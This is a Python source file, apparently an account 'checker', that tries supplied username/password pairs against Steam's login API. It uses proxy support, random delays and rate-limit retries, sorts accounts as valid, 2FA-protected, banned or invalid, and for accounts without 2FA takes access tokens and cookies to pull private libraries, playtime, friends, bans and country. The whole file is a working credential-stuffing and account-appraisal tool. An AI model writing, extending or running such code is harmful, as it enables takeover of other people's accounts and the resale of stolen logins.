# steam_checker.py
import os
import re
import time
import random
import base64
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from steam_auth_pb2 import (
    CAuthentication_GetPasswordRSAPublicKey_Request,
    CAuthentication_GetPasswordRSAPublicKey_Response,
    CAuthentication_BeginAuthSessionViaCredentials_Request,
    CAuthentication_BeginAuthSessionViaCredentials_Response,
    CAuthentication_PollAuthSessionStatus_Request,
    CAuthentication_PollAuthSessionStatus_Response,
)

STEAM_API_KEY = os.getenv("STEAM_API_KEY")


def pkcs1pad2(data: str, keysize: int):
    """PKCS1 padding used by Steam"""
    if keysize < len(data) + 11:
        return None

    buffer = [0] * keysize
    i = len(data) - 1

    while i >= 0 and keysize > 0:
        keysize -= 1
        buffer[keysize] = ord(data[i])
        i -= 1

    keysize -= 1
    buffer[keysize] = 0

    while keysize > 2:
        keysize -= 1
        buffer[keysize] = int.from_bytes(os.urandom(1), 'big') % 254 + 1

    keysize -= 1
    buffer[keysize] = 2
    keysize -= 1
    buffer[keysize] = 0

    result = 0
    for byte in buffer:
        result = (result << 8) | byte
    return result


def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str | None:
    password = ''.join(char for char in password if ord(char) <= 127)
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    keysize = (n.bit_length() + 7) >> 3

    padded_data = pkcs1pad2(password, keysize)
    if not padded_data:
        return None

    encrypted_data = pow(padded_data, e, n)
    hex_str = hex(encrypted_data)[2:]
    if len(hex_str) % 2 == 1:
        hex_str = '0' + hex_str
    hex_bytes = bytes.fromhex(hex_str)
    return base64.b64encode(hex_bytes).decode('ascii')


def _poll_for_access_token(session: requests.Session, client_id: int, request_id: bytes) -> str | None:
    """
    Poll PollAuthSessionStatus to get an access_token for the logged-in account.
    Only call this for non-2FA accounts (2FA won't resolve until user confirms).
    Returns the access_token string or None if polling fails/times out.
    """
    for attempt in range(3):
        try:
            poll_req = CAuthentication_PollAuthSessionStatus_Request()
            poll_req.client_id = client_id
            poll_req.request_id = request_id
            poll_b64 = base64.b64encode(poll_req.SerializeToString()).decode("ascii")

            poll_raw = session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
                data={"input_protobuf_encoded": poll_b64},
                timeout=15,
            )

            poll_resp = CAuthentication_PollAuthSessionStatus_Response()
            poll_resp.ParseFromString(poll_raw.content)

            if hasattr(poll_resp, 'access_token') and poll_resp.access_token:
                print(f"[Steam] Got access_token via poll (attempt {attempt + 1})")
                return poll_resp.access_token

            if hasattr(poll_resp, 'refresh_token') and poll_resp.refresh_token:
                print(f"[Steam] Got refresh_token via poll (attempt {attempt + 1})")
                return poll_resp.refresh_token

        except Exception as e:
            print(f"[Steam] Poll attempt {attempt + 1} failed: {e}")

        if attempt < 2:
            time.sleep(1)

    return None

def _scrape_total_game_count(steamid: str, session: requests.Session = None) -> int:
    try:
        url = f"https://steamcommunity.com/profiles/{steamid}/games?xml=1&tab=all"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        
        requester = session if session else requests
        resp = requester.get(url, headers=headers, timeout=10)
        
        if resp.status_code != 200 or '<title>Sign In</title>' in resp.text:
            print(f"[Steam XML] Auth required or redirect for {steamid}")
            return 0
        
        count = resp.text.count('<game>')
        if count > 0:
            print(f"[Steam XML] Total count: {count} for {steamid}")
            return count
    except Exception as e:
        print(f"[Steam] XML game count failed: {e}")
    return 0

def _count_unplayed_games(extra_appids: list, session: requests.Session) -> tuple[int, list]:
    """
    Given appIDs that appear in rgOwnedApps but NOT in GetOwnedGames,
    parallel-check each one against the Steam store API and return
    (count, games_list) for those whose type is 'game'.
    Capped at 150 appIDs; uses up to 20 concurrent workers.
    """
    if not extra_appids:
        return 0, []

    appids = extra_appids[:150]

    def _fetch_game(appid: int):
        try:
            resp = session.get(
                f"https://store.steampowered.com/api/appdetails"
                f"?appids={appid}&filters=basic",
                timeout=6
            )
            if resp.status_code == 200:
                data = resp.json()
                info = data.get(str(appid), {})
                if info.get("success") is True and info.get("data", {}).get("type") == "game":
                    name = info["data"].get("name", f"AppID {appid}")
                    return {
                        "name": name,
                        "playtime_hours": 0,
                        "playtime_display": "0m"
                    }
        except Exception:
            pass
        return None

    workers = min(20, len(appids))
    results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_fetch_game, aid): aid for aid in appids}
        for f in as_completed(futures):
            r = f.result()
            if r:
                results.append(r)

    return len(results), results    

def check_steam(username: str, password: str, proxy=None, _retry=0) -> dict:
    result = {
        'email': username,
        'password': password,
        'success': False,
        'profile_visibility': 'Unknown',
        'message': '',
        'steamid': 'N/A',
        'twofa': False,
        'twofa_type': 'None',
        'profile_name': 'Unknown',
        'profile_url': '',
        'country': 'Unknown',
        'vac_banned': False,
        'community_banned': False,
        'trade_banned': False,
        'number_of_vac_bans': 0,
        'days_since_last_ban': 0,
        'steam_level': 0,
        'friends_count': 0,
        'recent_games': [],
        'limited': False,
        'games_count': 0,
        'total_games_owned': 0,
        'total_playtime': 0,
        'games': [],
        'avatar_url': '',
    }

    try:
        session = requests.Session()
        time.sleep(random.uniform(0.5, 1.5))
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}

        # 1. Get RSA Key
        rsa_req = CAuthentication_GetPasswordRSAPublicKey_Request()
        rsa_req.account_name = username
        rsa_bytes = rsa_req.SerializeToString()
        rsa_base64 = base64.b64encode(rsa_bytes).decode("ascii")

        url_key = (
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=https%3A%2F%2Fstore.steampowered.com&input_protobuf_encoded={rsa_base64}"
        )

        resp = session.get(url_key, timeout=25)
        resp.raise_for_status()

        rsa_resp = CAuthentication_GetPasswordRSAPublicKey_Response()
        rsa_resp.ParseFromString(resp.content)

        modulus_hex = rsa_resp.publickey_mod.strip()
        exponent_hex = rsa_resp.publickey_exp.strip()
        timestamp = rsa_resp.timestamp

        # 2. Encrypt password
        encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
        if not encrypted_b64:
            result['message'] = "RSA encryption failed"
            return result

        # 3. Begin Auth Session (Modern Protobuf)
        auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
        auth_req.account_name = username
        auth_req.device_friendly_name = ""
        auth_req.encrypted_password = encrypted_b64
        auth_req.encryption_timestamp = timestamp
        auth_req.website_id = "Store"
        auth_req.platform_type = 2

        auth_bytes = auth_req.SerializeToString()
        auth_base64 = base64.b64encode(auth_bytes).decode("ascii")

        boundary = "----WebKitFormBoundaryuVO4LkJu0mV4BkLt"
        multipart_data = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="input_protobuf_encoded"\r\n\r\n'
            f"{auth_base64}\r\n"
            f"--{boundary}--\r\n"
        )

        headers = {
            "Host": "api.steampowered.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://store.steampowered.com",
            "Referer": "https://store.steampowered.com/",
        }

        url_auth = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1"
        resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)

        x_eresult = resp.headers.get('X-eresult', '')
        print(f"[DEBUG Steam] {username} | X-eresult: {x_eresult}")

        # ==================== 2FA DETECTION ====================
        is_twofa = False
        auth_resp = None
        client_id = None
        request_id = None

        try:
            auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
            auth_resp.ParseFromString(resp.content)

            if hasattr(auth_resp, 'client_id') and auth_resp.client_id:
                client_id = auth_resp.client_id
            if hasattr(auth_resp, 'request_id') and auth_resp.request_id:
                request_id = auth_resp.request_id

            if hasattr(auth_resp, 'allowed_confirmations') and len(auth_resp.allowed_confirmations) > 0:
                confirmation_types = [c.confirmation_type for c in auth_resp.allowed_confirmations]

                if any(ct == 3 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Authenticator"
                elif any(ct == 2 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Email Guard"
                elif any(ct in [4, 5] for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Device Guard"

                print(f"[DEBUG Steam] Types: {confirmation_types} | 2FA: {is_twofa}")

            if hasattr(auth_resp, 'steamid') and auth_resp.steamid:
                result['steamid'] = str(auth_resp.steamid)

        except Exception as e:
            print(f"[DEBUG Steam] Protobuf parse failed: {e}")

        # ==================== FINAL DECISION ====================
        if is_twofa:
            result['twofa'] = True
            result['success'] = True
            result['message'] = "2FA Required"
        elif x_eresult in ['1', 'OK'] or len(resp.content) > 50:
            result['success'] = True
            result['message'] = "Valid Account"
        elif x_eresult == '5':
            result['message'] = "Invalid username or password"
            return result
        elif x_eresult == '6':
            result['message'] = "Account not found"
            return result
        elif x_eresult == '84':
            if _retry < 2:
                wait = (8 + _retry * 5) + random.uniform(2, 4)
                print(f"[Steam] Rate limited, retry {_retry+1}/2 in {wait:.1f}s...")
                time.sleep(wait)
                return check_steam(username, password, proxy, _retry=_retry + 1)
            else:
                result['message'] = "Rate limited by Steam, try again later"
                return result
        elif x_eresult == '2':
            result['message'] = "Account disabled / banned"
            return result
        elif x_eresult == '15':
            result['message'] = "Account does not exist"
            return result
        else:
            result['message'] = f"Unknown error (eresult: {x_eresult})"
            return result

        # ==================== GET ACCESS TOKEN ====================
        access_token = None
        if not is_twofa and client_id and request_id:
            access_token = _poll_for_access_token(session, client_id, request_id)
            if access_token:
                print(f"[Steam] Using access_token for {username} (private profiles unlocked)")
                cookie_val = f"{result['steamid']}%7C%7C{access_token}"
                for _domain in ['steamcommunity.com', 'store.steampowered.com']:
                    session.cookies.set('steamLoginSecure', cookie_val, domain=_domain)
            else:
                print(f"[Steam] No access_token, falling back to API key for {username}")

        def auth_param() -> str:
            """access_token= for private endpoints, key= for public ones."""
            if access_token:
                return f"access_token={access_token}"
            return f"key={STEAM_API_KEY}"

        # ==================== RICH DATA ====================
        if result['steamid'] != 'N/A':
            try:
                # ── Player Summary ──────────────────────────────────────────
                summary_url = (
                    f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/"
                    f"?key={STEAM_API_KEY}&steamids={result['steamid']}"
                )
                summary_resp = session.get(summary_url, timeout=15)
                if summary_resp.status_code == 200:
                    players = summary_resp.json().get("response", {}).get("players", [])
                    if players:
                        data = players[0]
                        result['profile_name'] = data.get("personaname") or f"ID:{result['steamid'][:8]}"
                        result['profile_url'] = data.get("profileurl", "")
                        result['avatar_url'] = data.get("avatarfull", "")
                        country = data.get("loccountrycode", "").strip()
                        result['country'] = country if country else "Unknown"
                        print(f"[Steam] Country from summary: '{result['country']}'")
                        visibility = data.get("communityvisibilitystate", 1)
                        result['profile_visibility'] = {
                            1: "Private",
                            2: "Friends Only",
                            3: "Public"
                        }.get(visibility, "Unknown")

                # ── Country + Limited via store API (uses community cookie) ──
                # FIX 1: replaced GetUserAccountDetails (404s — requires protobuf POST)
                # with store userdata API which works with the steamLoginSecure cookie.
                _store_owned_apps: list = []  # all appIDs from store (games + DLCs + tools)
                if access_token:
                    try:
                        userdata_resp = session.get(
                            "https://store.steampowered.com/dynamicstore/userdata/",
                            timeout=10
                        )
                        if userdata_resp.status_code == 200:
                            userdata = userdata_resp.json()
                            # Country
                            cc = userdata.get("UserCountry", "").strip()
                            if cc and result['country'] in ['Unknown', '']:
                                result['country'] = cc
                                print(f"[Steam] Store country: {cc} for {username}")
                            # rgOwnedApps = all owned appIDs (games + DLCs + soundtracks + tools)
                            _store_owned_apps = userdata.get("rgOwnedApps", [])
                            print(f"[Steam] Store rgOwnedApps: {len(_store_owned_apps)} for {username}")
                    except Exception as e:
                        print(f"[Steam] Store userdata failed: {e}")

                # ── VAC / Ban Info ──────────────────────────────────────────
                bans_url = (
                    f"https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/"
                    f"?key={STEAM_API_KEY}&steamids={result['steamid']}"
                )
                bans_resp = session.get(bans_url, timeout=15)
                if bans_resp.status_code == 200:
                    players_bans = bans_resp.json().get("players", [])
                    if players_bans:
                        ban_data = players_bans[0]
                        result['vac_banned'] = ban_data.get("VACBanned", False)
                        result['community_banned'] = ban_data.get("CommunityBanned", False)
                        result['trade_banned'] = ban_data.get("EconomyBan", "none") != "none"
                        result['number_of_vac_bans'] = ban_data.get("NumberOfVACBans", 0)
                        result['days_since_last_ban'] = ban_data.get("DaysSinceLastBan", 0)

                # ── Steam Level ─────────────────────────────────────────────
                level_url = (
                    f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/"
                    f"?{auth_param()}&steamid={result['steamid']}"
                )
                level_resp = session.get(level_url, timeout=15)
                if level_resp.status_code == 200:
                    result['steam_level'] = level_resp.json().get("response", {}).get("player_level", 0)

                # ── Friends Count ───────────────────────────────────────────
                friends_url = (
                    f"https://api.steampowered.com/ISteamUser/GetFriendList/v1/"
                    f"?{auth_param()}&steamid={result['steamid']}&relationship=friend"
                )
                friends_resp = session.get(friends_url, timeout=15)
                if friends_resp.status_code == 200:
                    friends_list = friends_resp.json().get("friendslist", {}).get("friends", [])
                    result['friends_count'] = len(friends_list)

                # ── Recent Games ────────────────────────────────────────────
                recent_url = (
                    f"https://api.steampowered.com/IPlayerService/GetRecentlyPlayedGames/v1/"
                    f"?{auth_param()}&steamid={result['steamid']}&count=5"
                )
                recent_resp = session.get(recent_url, timeout=15)
                if recent_resp.status_code == 200:
                    recent_games = recent_resp.json().get("response", {}).get("games", [])
                    result['recent_games'] = [
                        {
                            "name": g.get("name", "Unknown"),
                            "playtime_2weeks": g.get("playtime_2weeks", 0)  # raw minutes
                        }
                        for g in recent_games
                    ]

                # ── Owned Games ─────────────────────────────────────────────
                games_count = 0
                games_list = []
                full_games_list: list = []   # no-appinfo call: all played appids + playtime
                played_appids: set = set()   # appIDs from GetOwnedGames (all launched games)

                if access_token:
                    # access_token path (v1): sees private libraries.
                    # Two calls:
                    #   A) without include_appinfo → full list (all played games, correct count + playtime)
                    #   B) with include_appinfo    → named list (may be shorter: Steam strips store-deleted games)
                    # Use A for games_count / played_appids / total_playtime.
                    # Use B for the display names in result['games'].

                    # --- Call A: full list, no app info ---
                    games_url_full = (
                        f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
                        f"?access_token={access_token}&steamid={result['steamid']}"
                        f"&include_played_free_games=1"
                    )
                    full_resp = session.get(games_url_full, timeout=15)
                    full_games_list = []
                    if full_resp.status_code == 200:
                        full_data = full_resp.json().get("response", {})
                        full_games_list = full_data.get("games", [])
                        api_game_count = full_data.get("game_count", 0)
                        if api_game_count > 0:
                            games_count = api_game_count
                            result['games_count'] = games_count
                            played_appids = {g['appid'] for g in full_games_list if 'appid' in g}
                            print(f"[Steam] access_token games (full): {games_count} for {username}")

                    # --- Call B: named list, with app info (may be shorter) ---
                    games_url = (
                        f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
                        f"?access_token={access_token}&steamid={result['steamid']}"
                        f"&include_appinfo=1&include_played_free_games=1"
                    )
                    games_resp = session.get(games_url, timeout=15)
                    if games_resp.status_code == 200:
                        games_data = games_resp.json().get("response", {})
                        named_list = games_data.get("games", [])
                        if named_list:
                            games_list = named_list
                            # Only update games_count from appinfo call if full call failed
                            if games_count == 0:
                                games_count = games_data.get("game_count", 0)
                                result['games_count'] = games_count
                                played_appids = {g['appid'] for g in games_list if 'appid' in g}
                            print(f"[Steam] access_token games (named): {len(games_list)} for {username}")

                if games_count == 0 and STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
                    # API key fallback: public profiles only
                    games_url = (
                        f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/"
                        f"?key={STEAM_API_KEY}&steamid={result['steamid']}"
                        f"&format=json&include_appinfo=1&include_played_free_games=1"
                    )
                    games_resp = session.get(games_url, timeout=15)
                    if games_resp.status_code == 200:
                        games_data = games_resp.json().get("response", {})
                        games_count = games_data.get("game_count", 0)
                        games_list = games_data.get("games", [])

                if games_count == 0:
                    # Last resort: Steam Community endpoint
                    community_url = (
                        f"https://steamcommunity.com/actions/GetOwnedGames"
                        f"?steamid={result['steamid']}&format=json&include_appinfo=1"
                    )
                    community_resp = session.get(
                        community_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"}
                    )
                    if community_resp.status_code == 200:
                        try:
                            comm_data = community_resp.json().get("response", {})
                            games_count = comm_data.get("game_count", 0)
                            games_list = comm_data.get("games", [])
                        except Exception:
                            pass

                if games_list:
                    # played_appids is already set from full_games_list (call A).
                    # If it wasn't set (access_token failed, fell through to API key/community),
                    # populate it now from whatever list we have.
                    if not played_appids:
                        played_appids = {g['appid'] for g in games_list if 'appid' in g}

                    sorted_games = sorted(
                        games_list,
                        key=lambda x: x.get("playtime_forever", 0),
                        reverse=True
                    )

                    # games_count: prefer the API game_count (full list); only fall back
                    # to len(named_list) if we never got a value from call A.
                    if games_count == 0:
                        games_count = len(sorted_games)
                    result['games_count'] = games_count

                    # Total playtime: use full_games_list (all 112 games) when available
                    # so playtime isn't under-counted by the shorter named list.
                    playtime_source = full_games_list if full_games_list else sorted_games
                    total_minutes = sum(g.get("playtime_forever", 0) for g in playtime_source)
                    result['total_playtime'] = total_minutes // 60  # hours, kept for backwards compat
                    result['total_playtime_display'] = (
                        f"{total_minutes // 60}h {total_minutes % 60}m"
                        if total_minutes >= 60 else f"{total_minutes}m"
                    )
                    result['games'] = [
                        {
                            "name": g.get("name", "Unknown Game"),
                            "playtime_hours": g.get("playtime_forever", 0) // 60,
                            "playtime_display": (
                                f"{g.get('playtime_forever', 0) // 60}h "
                                f"{g.get('playtime_forever', 0) % 60}m"
                                if g.get("playtime_forever", 0) >= 60
                                else f"{g.get('playtime_forever', 0)}m"
                            )
                        }
                        for g in sorted_games
                    ]

                # FIX 2 (cont.): if games_list was empty but API reported a count,
                # carry that count forward so the XML scrape condition fires correctly
                if result['games_count'] == 0 and games_count > 0:
                    result['games_count'] = games_count

                # ── Limited account detection ───────────────────────────────
                # rgOwnedApps > 0 = cookie authed on store domain; has apps → not limited.
                # Fall back to game count if store gave nothing.
                if _store_owned_apps or result['games_count'] > 0:
                    result['limited'] = False

                # ── Total games owned ───────────────────────────────────────
                # Strategy:
                #   1. Start with the GetOwnedGames count (played games, includes played F2P).
                #   2. Find appIDs in rgOwnedApps that are NOT in GetOwnedGames.
                #      These are either DLCs/tools/soundtracks OR never-launched F2P games.
                #   3. Parallel-check each unknown appID via the Steam store API to keep
                #      only those with type="game" (e.g. Destiny 2 added but never launched).
                #   4. Add confirmed extra games to the total.
                #   5. If rgOwnedApps was empty (cookie didn't auth on store), fall back
                #      to the XML scrape which counts library game entries for public profiles.
                if _store_owned_apps and played_appids:
                    store_appid_set = set(_store_owned_apps)
                    extra_appids = list(store_appid_set - played_appids)
                    if extra_appids:
                        print(
                            f"[Steam] Checking {len(extra_appids)} unknown appIDs "
                            f"for unplayed games for {username}..."
                        )
                        unplayed_count, unplayed_games = _count_unplayed_games(extra_appids, session)
                        if unplayed_count:
                            print(f"[Steam] Found {unplayed_count} unplayed game(s) in rgOwnedApps for {username}")
                            result['games'] = result.get('games', []) + sorted(unplayed_games, key=lambda x: x['name'])
                        result['total_games_owned'] = result['games_count'] + unplayed_count
                    else:
                        result['total_games_owned'] = result['games_count']
                elif _store_owned_apps and not played_appids:
                    # Has store apps but GetOwnedGames returned nothing — trust store count via type-check
                    unplayed_count, unplayed_games = _count_unplayed_games(list(_store_owned_apps), session)
                    result['games'] = result.get('games', []) + sorted(unplayed_games, key=lambda x: x['name'])
                    result['total_games_owned'] = unplayed_count
                    result['games_count'] = result['games_count'] or unplayed_count
                else:
                    # No store data — fall back to XML scrape for public profiles
                    if result['games_count'] > 0 or result['profile_visibility'] == "Public":
                        scraped_count = _scrape_total_game_count(result['steamid'], session)
                        if scraped_count > result['games_count']:
                            print(
                                f"[Steam] XML total: {scraped_count} "
                                f"(API returned {result['games_count']}) for {username}"
                            )
                            result['total_games_owned'] = scraped_count
                        else:
                            result['total_games_owned'] = result['games_count']
                    else:
                        result['total_games_owned'] = result['games_count']

            except Exception as e:
                print(f"[Steam] Extra data error: {e}")

    except Exception as e:
        result['message'] = f"Error: {str(e)[:80]}"

    return result
